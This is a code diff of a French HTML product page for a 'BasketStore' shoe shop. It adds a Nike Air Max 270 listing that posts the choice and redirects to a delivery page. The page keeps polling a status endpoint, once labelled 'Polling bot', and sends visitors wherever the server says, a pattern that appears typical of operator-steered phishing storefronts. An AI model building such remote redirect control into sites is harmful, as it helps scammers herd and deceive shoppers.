@@ -1,51 +1,68 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Produit - BasketStore</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align:center; padding:40px; }
-    h1 { color:#222; }
-    button { margin:10px; padding:15px 25px; border-radius:10px; font-size:1.1em; cursor:pointer; }
-    .pair-btn { background-color:#28a745; color:white; border:none; }
-    .pair-btn:hover { background-color:#1e7e34; }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+      background: linear-gradient(135deg, #f0f0f0, #d0e0ff);
+    }
+    img {
+      max-width: 300px;
+      border-radius: 15px;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 1.1em;
+    }
+    button:hover { background-color: #218838; }
   </style>
 </head>
 <body>
-  <h1>👟 Choisissez votre paire</h1>
-  <button class="pair-btn" data-pair="Paire A">Paire A</button>
-  <button class="pair-btn" data-pair="Paire B">Paire B</button>
-  <button class="pair-btn" data-pair="Paire C">Paire C</button>
+  <h1>👟 Nike Air Max 270</h1>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Nike_Air_Max_270.png" alt="Nike Air Max 270">
+  <p>Confort et style ultime pour vos journées actives.</p>
+  <button id="chooseProduct">Choisir cette paire</button>
 
   <script>
-    // Boutons paire
-    document.querySelectorAll('.pair-btn').forEach(btn=>{
-      btn.addEventListener('click', async ()=>{
-        const pair = btn.dataset.pair;
-        try {
-          await fetch('/api/pair', {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({pair})
-          });
-        } catch(e){ console.error(e); }
-        // Redirection frontend vers livraison
-        window.location.href = '/delivery.html';
+    document.getElementById('chooseProduct').addEventListener('click', async () => {
+      await fetch('/api/pair', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ pair: 'Nike Air Max 270' })
       });
+      window.location.href = '/delivery.html';
     });
 
-    // Polling bot
-    async function checkBotRedirect() {
+    let checking = false, lastRedirect = null;
+    async function checkStatus() {
+      if (checking) return;
+      checking = true;
       try {
-        const res = await fetch('/api/status');
+        const res = await fetch('/api/status', { cache: 'no-store' });
         const data = await res.json();
-        if (data.redirect && window.location.pathname !== data.redirect) {
+        if (data.redirect && data.redirect !== lastRedirect) {
+          lastRedirect = data.redirect;
           window.location.href = data.redirect;
-        } else { setTimeout(checkBotRedirect, 2000); }
-      } catch(e){ setTimeout(checkBotRedirect, 2000); }
+          return;
+        }
+      } catch {}
+      finally {
+        checking = false;
+        setTimeout(checkStatus, 2500);
+      }
     }
-    checkBotRedirect();
+    checkStatus();
   </script>
 </body>
 </html>
